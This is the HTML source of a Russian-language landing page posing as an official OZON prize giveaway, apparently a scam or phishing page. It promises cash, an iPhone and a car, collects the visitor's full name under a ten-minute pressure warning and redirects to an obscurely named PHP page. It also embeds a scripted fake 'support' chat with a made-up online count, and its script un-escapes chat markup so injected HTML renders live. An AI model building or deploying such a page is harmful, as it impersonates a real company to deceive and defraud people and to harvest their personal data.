<!DOCTYPE html>

<html lang="ru-RU">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Официальный розыгрыш от OZON</title>

<link rel="icon" href="favicon.ico" type="image/x-icon">

<script src="https://cdn.tailwindcss.com"></script>

<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;800&family=Poppins:wght@400;600&family=Exo+2:wght@400;600;700&display=swap" rel="stylesheet">

<style>

:root {

  --ozon-blue: #005BFF;

  --ozon-cyan: #00D4FF;

  --ozon-dark: #001122;

  --glass: rgba(255,255,255,0.04);

}

body { margin:0; padding:0; color:#f0f8ff; font-family:'Poppins',sans-serif; background:var(--ozon-dark); min-height:100vh; overflow-x:hidden; }

body::after { content:""; position:fixed; inset:0; opacity:0.025; pointer-events:none; z-index:9999; background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E"); }

.cyber-grid { position:fixed; inset:0; background:linear-gradient(rgba(0,212,255,0.05) 1px,transparent 1px), linear-gradient(90deg,rgba(0,212,255,0.05) 1px,transparent 1px); background-size:50px 50px; z-index:-1; transform:perspective(1200px) rotateX(65deg); }

body::before { content:""; position:fixed; inset:0; background:radial-gradient(circle at 20% 20%, rgba(0,91,255,0.3) 0%,transparent 50%), radial-gradient(circle at 80% 80%, rgba(0,212,255,0.15) 0%,transparent 50%); z-index:-2; filter:blur(120px); }

.main-wrapper { max-width:1150px; margin:0 auto; position:relative; z-index:10; padding-bottom:100px; }

.top-bar { background:rgba(0,17,34,0.8); backdrop-filter:blur(24px); padding:1rem 2rem; border-bottom:1px solid rgba(0,212,255,0.25); position:sticky; top:0; z-index:100; display:flex; align-items:center; justify-content:space-between; }

.top-bar img { height:42px; filter:drop-shadow(0 0 14px var(--ozon-cyan)); }

.hero-panel { text-align:center; padding:6rem 1.5rem 4rem; background:linear-gradient(180deg,rgba(255,255,255,0.03) 0%,transparent); border-radius:0 0 90px 90px; border:1px solid rgba(0,212,255,0.08); box-shadow:0 50px 120px -30px #000c; }

.hero-panel h1 { font-size:clamp(3rem,9vw,5.5rem); line-height:0.92; margin-bottom:2.5rem; font-weight:900; background:linear-gradient(to bottom,#fff,#e0f0ff); -webkit-background-clip:text; -webkit-text-fill-color:transparent; filter:drop-shadow(0 0 40px rgba(0,212,255,0.35)); }

.banner-box { max-width:900px; margin:2.5rem auto; border-radius:48px; overflow:hidden; background:#000; border:1px solid rgba(0,212,255,0.18); box-shadow:0 35px 110px #000a; position:relative; }

.banner-box::before { content:""; position:absolute; width:100%; height:3px; background:var(--ozon-cyan); box-shadow:0 0 20px var(--ozon-cyan); animation:scan 5s linear infinite; }

@keyframes scan { 0%{top:0;opacity:0} 10%{opacity:1} 90%{opacity:1} 100%{top:100%;opacity:0} }

.reg-form { max-width:440px; margin:5rem auto; }

.input-group { position:relative; margin-bottom:1.5rem; }

.reg-form input { width:100%; padding:1.5rem; border-radius:24px; background:rgba(0,0,0,0.5); border:1px solid rgba(0,212,255,0.22); color:#fff; font-size:1.15rem; text-align:center; transition:0.45s; backdrop-filter:blur(14px); }

.reg-form input:focus { border-color:var(--ozon-cyan); box-shadow:0 0 40px rgba(0,212,255,0.3); }

.progress-container { width:100%; height:6px; background:rgba(255,255,255,0.08); border-radius:3px; margin-bottom:1.5rem; overflow:hidden; }

.progress-bar { height:100%; background:var(--ozon-cyan); transition:width 0.4s ease; box-shadow:0 0 12px var(--ozon-cyan); width:30%; }

.action-btn { width:100%; background:#fff; color:#001122; padding:1.6rem; border-radius:24px; font-size:1.25rem; font-weight:800; font-family:'Orbitron'; text-transform:uppercase; letter-spacing:1px; box-shadow:0 12px 35px #0006; cursor:pointer; transition:0.4s; }

.action-btn:hover { background:var(--ozon-cyan); transform:translateY(-6px); box-shadow:0 25px 50px rgba(0,212,255,0.45); }

.prizes-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(320px,1fr)); gap:2rem; padding:4rem 1rem; }

.prize-card { background:var(--glass); border:1px solid rgba(0,212,255,0.15); border-radius:48px; padding:3rem 2rem; transition:0.55s cubic-bezier(0.23,1,0.32,1); overflow:hidden; text-align:center; }

.prize-card:hover { transform:translateY(-18px); background:rgba(255,255,255,0.06); border-color:rgba(0,212,255,0.35); }

.prize-card::after { content:""; position:absolute; width:120px; height:120px; background:var(--ozon-cyan); filter:blur(90px); opacity:0; transition:0.6s; top:-60px; right:-60px; }

.prize-card:hover::after { opacity:0.5; }

.prize-card img { width:140px; margin:0 auto 1.5rem; filter:drop-shadow(0 20px 35px #0008); transition:0.5s; }

.prize-card:hover img { transform:scale(1.08) translateY(-8px); filter:drop-shadow(0 30px 55px rgba(0,212,255,0.4)); }

.prize-card h3 { font-family:'Orbitron'; font-size:1.8rem; margin-bottom:0.5rem; }

.contest-warning { padding:4rem 1rem; text-align:center; border-top:1px solid rgba(0,212,255,0.15); }

.warning-badge { background:rgba(0,212,255,0.15); border:1px solid var(--ozon-cyan); color:var(--ozon-cyan); padding:8px 20px; border-radius:50px; font-weight:800; animation:pulse 2.2s infinite; }

@keyframes pulse { 0%,100% { box-shadow:0 0 0 0 rgba(0,212,255,0.4); } 70% { box-shadow:0 0 0 15px rgba(0,212,255,0); } }

/* 1. ГЛАВНЫЙ КОРПУС */

    #urbw {

        width: 100%;

        display: flex;

        justify-content: center;

        margin: 3rem 0;

        perspective: 1500px;

    }



    .urbwmpuz { 

        width: 100%; max-width: 650px; height: 650px;

        background: radial-gradient(circle at top left, rgba(7, 26, 56, 0.85), rgba(0, 5, 15, 0.95));

        backdrop-filter: blur(35px) saturate(200%);

        -webkit-backdrop-filter: blur(35px) saturate(200%);

        border-radius: 40px; 

        border: 1px solid rgba(0, 212, 255, 0.2); 

        display: flex; flex-direction: column; 

        box-shadow: 0 50px 100px rgba(0,0,0,0.9), inset 0 0 40px rgba(0, 212, 255, 0.05);

        overflow: hidden;

        position: relative;

    }



    /* 2. ШАПКА */

    .urbwmpuz-header { 

        padding: 1.5rem 2rem;

        background: linear-gradient(90deg, rgba(0, 91, 255, 0.2), transparent);

        border-bottom: 1px solid rgba(0, 212, 255, 0.2);

        display: flex; align-items: center; justify-content: space-between;

    }



    .urbwmpuz-logo { display: flex; align-items: center; gap: 15px; }

    /* Круглая аватарка в шапке */

    .urbwmpuz-logo img { width: 45px; height: 45px; border-radius: 50%; border: 2px solid var(--ozon-cyan); box-shadow: 0 0 15px rgba(0, 212, 255, 0.5); object-fit: cover; }

    .urbwmpuz-logo__name { font-family: 'Orbitron'; font-size: 14px; color: #fff; letter-spacing: 2px; text-shadow: 0 0 8px rgba(0, 212, 255, 0.6); }



    /* 3. КОНТЕЙНЕР СООБЩЕНИЙ */

    .urbwmpuz-body { 

        flex: 1; overflow-y: auto; padding: 25px; 

        display: flex; flex-direction: column;

        background: radial-gradient(circle at 50% 50%, rgba(0, 91, 255, 0.05) 0%, transparent 80%);

    }



    /* Скроллбар */

    .urbwmpuz-body::-webkit-scrollbar { width: 4px; }

    .urbwmpuz-body::-webkit-scrollbar-thumb { background: var(--ozon-cyan); border-radius: 10px; }



    .urbwmpuz-body__wrapper { display: flex; flex-direction: column; gap: 24px; }



    /* 4. ВИД СООБЩЕНИЙ */

    .urbwmpuz-message { 

        display: flex; gap: 12px; max-width: 85%;

        animation: messageSlideIn 0.5s cubic-bezier(0.18, 0.89, 0.32, 1.28) forwards;

    }



    /* Круглые аватарки в сообщениях */

    .urbwmpuz-message__avatar {

        width: 40px; height: 40px; border-radius: 50% !important; 

        flex-shrink: 0; border: 2px solid rgba(0, 212, 255, 0.2);

        background-color: #001122; align-self: flex-end;

        object-fit: cover;

    }



    .urbwmpuz-message__content { display: flex; flex-direction: column; gap: 4px; }

    

    .urbwmpuz-message__body { 

        padding: 14px 20px; font-size: 14px; line-height: 1.6; 

        position: relative; box-shadow: 0 8px 20px rgba(0,0,0,0.3);

    }



    .urbwmpuz-message__name { font-size: 11px; font-weight: 800; text-transform: uppercase; color: var(--ozon-cyan); margin-bottom: 2px; letter-spacing: 1px; }



    /* Сообщение ПОДДЕРЖКИ (слева) */

    .urbwmpuz-message._support { align-self: flex-start; }

    .urbwmpuz-message._support .urbwmpuz-message__body {

        background: rgba(255, 255, 255, 0.08);

        border: 1px solid rgba(255, 255, 255, 0.1);

        border-radius: 22px 22px 22px 4px;

        color: #f0fbff;

    }



    /* Сообщение ВЫ (справа) - ИСПРАВЛЕН ПУЗЫРЕК */

    .urbwmpuz-message._user { align-self: flex-end; flex-direction: row-reverse; }

    .urbwmpuz-message._user .urbwmpuz-message__body {

        background: linear-gradient(135deg, rgba(0, 110, 255, 0.4), rgba(0, 212, 255, 0.25));

        border: 1px solid rgba(0, 212, 255, 0.4);

        border-radius: 22px 22px 4px 22px;

        color: #fff;

    }



    /* 5. ФОТО В СООБЩЕНИЯХ */

    .urbwmpuz-message__attach {

        margin-top: 10px; border-radius: 18px; overflow: hidden;

        border: 1px solid rgba(0, 212, 255, 0.3);

        max-width: 220px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);

    }

    .urbwmpuz-message__attach img { width: 100%; height: auto; display: block; transition: 0.5s; }

    .urbwmpuz-message__attach:hover img { transform: scale(1.1); }



    /* 6. ФУТЕР И ПОЛЕ ВВОДА */

    .urbwmpuz-footer { 

        padding: 1.5rem; background: rgba(0, 8, 20, 0.95); 

        border-top: 1px solid rgba(0, 212, 255, 0.15);

    }



    .urbwmpuz-footer__form { 

        display: flex; gap: 12px; background: rgba(255,255,255,0.05); 

        padding: 6px 6px 6px 15px; border-radius: 25px; 

        border: 1px solid rgba(0,212,255,0.2);

        transition: 0.3s;

    }

    .urbwmpuz-footer__form:focus-within { border-color: var(--ozon-cyan); box-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }



    .urbwmpuz-footer__field { 

        flex: 1; background: transparent !important; border: none !important;

        padding: 10px 0 !important; color: #fff !important; font-size: 14px; outline: none !important;

    }



    .urbwmpuz-footer__send { 

        width: 42px; height: 42px; border-radius: 50% !important;

        background: linear-gradient(135deg, var(--ozon-blue), var(--ozon-cyan)) !important; 

        color: white; border: none !important; cursor: pointer;

        display: flex; align-items: center; justify-content: center;

        transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);

    }

    .urbwmpuz-footer__send:hover { transform: scale(1.1) rotate(-15deg); box-shadow: 0 0 15px var(--ozon-cyan); }



    /* АНИМАЦИИ */

    @keyframes messageSlideIn {

        from { opacity: 0; transform: translateY(20px) scale(0.8); }

        to { opacity: 1; transform: translateY(0) scale(1); }

    }

</style>

</head>

<body>

<div class="cyber-grid"></div>

<div class="main-wrapper">

    <header class="top-bar">

        <div class="logo-container flex items-center gap-4">

            <img src="images/ozon-logo.png" alt="OZON">

            <h1 class="text-white text-lg font-bold">PROMO EVENT 2026</h1>

        </div>

        <div class="text-xs opacity-70 text-right">

            СЕРВЕР: <span class="text-cyan-400">ONLINE</span><br>

            РЕГИОН: <span class="text-white">MSK-1</span>

        </div>

    </header>

    <div class="hero-panel">

        <h1>OZON <br><span style="color:var(--ozon-cyan);">GIVEAWAY</span></h1>

        <p class="text-gray-300 text-lg mb-8">Участвуйте в главном розыгрыше года и заберите один из 5 000 призов</p>

        <div class="banner-box">

            <video autoplay muted loop playsinline>

                <source src="header.mp4" type="video/mp4">

            </video>

        </div>

        <div class="reg-form">

            <div class="progress-container"><div class="progress-bar" id="pBar"></div></div>

            <div class="input-group">

                <input type="text" id="userFullName" placeholder="Введите ваше ФИО" oninput="updateProgress(this)">

            </div>

            <button class="action-btn" onclick="handleClaim()">Крутить барабан</button>

            <div class="flex justify-between mt-4 px-2 text-xs opacity-70">

                <span>ID: #OZ-559281</span>

                <span class="text-cyan-400 font-bold" id="attempts-count">3 ПОПЫТКИ ДОСТУПНО</span>

            </div>

        </div>

    </div>

    <div class="prizes-grid">

        <div class="prize-card">

            <span class="text-sm opacity-70">Категория: VIP</span>

            <img src="images/money-icon.png" alt="Money">

            <h3>500 000 ₽</h3>

            <p class="text-xs opacity-60">На карту или баланс</p>

        </div>

        <div class="prize-card">

            <span class="text-sm opacity-70">Категория: TECH</span>

            <img src="images/iphone-icon.png" alt="iPhone">

            <h3>APPLE iPHONE 16</h3>

            <p class="text-xs opacity-60">Доставка на пункт выдачи</p>

        </div>

        <div class="prize-card">

            <span class="text-sm opacity-70">Категория: PREMIUM</span>

            <img src="images/car-icon.png" alt="Car">

            <h3>GEELY MONJARO 2026</h3>

            <p class="text-xs opacity-60">Главный приз</p>

        </div>

    </div>

    <div class="contest-warning">

        <div class="warning-badge">ВАЖНО</div>

        <h2 class="text-2xl font-bold mb-4">ЗАБЕРИТЕ СВОЙ ПРИЗ СЕГОДНЯ</h2>

        <p class="text-gray-300 max-w-2xl mx-auto text-sm leading-relaxed">

            Из-за высокой нагрузки время регистрации ограничено. Через 10 минут сессия может быть передана другому участнику.

        </p>

    </div>

</div>



<div id="urbw">

      <div class="urbwmpuz" id="urbwmpuz" data-id="1707" data-disabled="false" data-delay="4">

        <div class="urbwmpuz-header" id="urbwmpuzHeader">

          <div class="urbwmpuz-logo">

            <img src="urbw/urbw-logo-3.png" alt="Support">

            <div class="urbwmpuz-logo__brand">

              <div class="urbwmpuz-logo__name" id="urbwmpuzTitle">Online поддержка</div>

              <div class="urbwmpuz-logo__online" id="urbwmpuzOnline">● В сети <span>62 чел.</span></div>

            </div>

          </div>

        </div>

        

        <div class="urbwmpuz-body" id="urbwmpuzBody">

          <div class="urbwmpuz-body__wrapper"></div>

          <div class="urbwmpuz-body__scroll" style="display:none;"></div>

          <div class="urbwmpuz-body-disabled" style="display:none;">

            <div class="urbwmpuz-body-disabled__ok"></div>

          </div>

        </div>

        

        <div class="urbwmpuz-footer" id="urbwmpuzFooter">

          <form class="urbwmpuz-footer__form" id="urbwmpuzForm">

            <input class="urbwmpuz-footer__field" type="text" placeholder="Введите сообщение..." id="urbwmpuzInput" autocomplete="off">

            <button class="urbwmpuz-footer__send" type="submit" id="urbwmpuzSubmit">

                <img src="urbw/go-3.png" alt="OK" width="20">

            </button>

          </form>

        </div>

      </div>

    </div>



<audio id="chatSound" src="sounds/chat-sound.mp3" preload="auto"></audio>



<script src="urbw/reteusnre.js"></script>

<script>

const chatBodyWrapper = document.querySelector('.urbwmpuz-body__wrapper');

const htmlFixObserver = new MutationObserver((mutations) => {

    mutations.forEach((mutation) => {

        mutation.addedNodes.forEach(node => {

            if (node.nodeType === 1) {

                if (node.innerHTML.includes('&lt;') || node.innerHTML.includes('<b>')) {

                    node.innerHTML = node.innerHTML.replace(/&lt;/g, '<').replace(/&gt;/g, '>');

                }

            }

        });

    });

});

if (chatBodyWrapper) { htmlFixObserver.observe(chatBodyWrapper, { childList: true, subtree: true }); }



let attempts = 3;

const chat = document.getElementById('urbwmpuz');

const chatIcon = document.getElementById('chatIcon');

const notif = document.querySelector('.new-message-notif');

const chatSound = document.getElementById('chatSound');

let chatOpened = false;



function toggleChat() {

    if (chatOpened) {

        chat.classList.add('urbwmpuz-collapsed');

        chatOpened = false;

    } else {

        chat.classList.remove('urbwmpuz-collapsed');

        chatOpened = true;

        notif.style.display = 'none';

    }

}

chatIcon.addEventListener('click', toggleChat);



function handleClaim() {

    const fio = document.getElementById('userFullName').value;

    if (!fio || fio.length < 5) { alert("Введите ФИО"); return; }

    if (attempts > 0) {

        attempts--;

        document.getElementById('attempts-count').innerText = `${attempts} ПОПЫТКИ ДОСТУПНО`;

        setTimeout(() => { window.location.href = 'eabvz1mv74y.php'; }, 2000);

    }

}



function updateProgress(input) {

    const bar = document.getElementById('pBar');

    if(input.value.length > 0) {

        bar.style.width = Math.min(input.value.length * 5, 100) + '%';

    } else {

        bar.style.width = '30%';

    }

}



const observer = new MutationObserver((mutations) => {

    mutations.forEach((m) => {

        if (m.addedNodes.length && !chatOpened) {

            notif.style.display = 'block';

            if (chatSound) chatSound.play().catch(e => {});

        }

    });

});

if (chatBodyWrapper) observer.observe(chatBodyWrapper, { childList: true, subtree: true });

</script>

</body>

</html>